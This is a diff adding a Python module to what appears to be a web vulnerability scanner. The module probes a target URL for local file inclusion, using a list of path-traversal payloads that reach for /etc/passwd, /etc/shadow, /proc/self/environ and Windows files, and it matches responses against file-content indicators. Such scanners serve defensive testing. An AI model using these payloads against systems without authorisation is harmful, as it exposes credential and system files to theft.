@@ -1,0 +1,131 @@
+from core import modules_base
+#!/usr/bin/env python3
+import requests
+from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl
+from typing import List, Dict, Any, Optional, Set
+import settings
+from core.modules.vulnerability_base import Scanner
+
+class Scanner(modules_base.Scanner):
+    name: str = "lfi"
+    description: str = "Local File Inclusion detection"
+    risk: str = "low"
+    useproxy: bool = getattr(settings, "USEPROXY", True)
+    enabled: bool = True
+    timeout: int = getattr(settings, "TIMEOUT", 8)
+    user_agent: str = getattr(settings, "USERAGENT", "QX-Scanner")
+    max_params_to_test: int = 3
+    max_payloads_per_param: int = 12
+
+    PAYLOADS: List[str] = [
+        "../../etc/passwd",
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../../../../../etc/passwd",
+        "..%2f..%2f..%2f..%2fetc%2fpasswd",
+        "....//....//....//etc/passwd",
+        "/proc/self/environ",
+        "/etc/shadow",
+        "../../boot.ini",
+        "../../../boot.ini",
+        "../../../../boot.ini",
+        "../../windows/win.ini",
+        "../../../windows/win.ini",
+        "file:///etc/passwd"
+    ]
+
+    INDICATORS: Set[str] = {
+        "root:x:0:0",
+        "[boot loader]",
+        "[operating systems]",
+        "nobody:x:",
+        "daemon:x:1:",
+        "bin:x:2:",
+        "sys:x:3:",
+        "adm:x:4:",
+        "SHELL=",
+        "PATH=",
+        "USER=",
+        "MAIL="
+    }
+
+    def __init__(self, target, config, report_dir, **kwargs):
+        self.session = requests.Session()
+        super().__init__(target, config, report_dir, **kwargs)
+        self.session.headers.update({"User-Agent": self.user_agent})
+
+    def _generate_test_cases(self) -> List[Dict[str, str]]:
+        parsed = urlparse(self.target)
+        queries = dict(parse_qsl(parsed.query))
+        test_cases = []
+
+        if queries:
+            for param in list(queries.keys())[:self.max_params_to_test]:
+                for payload in self.PAYLOADS[:self.max_payloads_per_param]:
+                    new_query = queries.copy()
+                    new_query[param] = payload
+                    test_url = parsed._replace(query=urlencode(new_query, doseq=True))
+                    test_cases.append({
+                        "url": urlunparse(test_url),
+                        "param": param,
+                        "payload": payload
+                    })
+        else:
+            base_url = self.target.rstrip("/")
+            for payload in self.PAYLOADS[:self.max_payloads_per_param]:
+                test_cases.append({
+                    "url": f"{base_url}?file={payload}",
+                    "param": "file",
+                    "payload": payload
+                })
+
+        return test_cases
+
+    def _execute_test(self, test_case: Dict[str, str]) -> Dict[str, Any]:
+        try:
+            response = self.session.get(
+                test_case["url"],
+                timeout=self.timeout,
+                allow_redirects=False,
+                proxies=getattr(self, "proxies", None)
+            )
+            
+            content = response.text.lower()
+            matched = any(indicator.lower() in content for indicator in self.INDICATORS)
+            
+            return {
+                **test_case,
+                "status_code": response.status_code,
+                "content_length": len(response.content),
+                "matched": matched,
+                "matched_patterns": [
+                    indicator for indicator in self.INDICATORS 
+                    if indicator.lower() in content
+                ][:3]
+            }
+        except requests.RequestException as e:
+            return {**test_case, "error": str(e)}
+
+    def scan(self) -> Dict[str, Any]:
+        test_cases = self._generate_test_cases()
+        results = [self._execute_test(case) for case in test_cases]
+        
+        vulnerable = any(result.get("matched") for result in results)
+        
+        return {
+            "ok": True,
+            "risk": "high" if vulnerable else "low",
+            "evidence": results,
+            "stats": {
+                "tested_urls": len(results),
+                "vulnerable_cases": sum(1 for r in results if r.get("matched")),
+                "common_patterns": list({
+                    pattern for r in results 
+                    for pattern in r.get("matched_patterns", [])
+                })[:5]
+            },
+            "notes": "LFI vulnerability scan with multiple payload variations"
+        }
+
+    def run(self) -> Dict[str, Any]:
+        return self.scan()
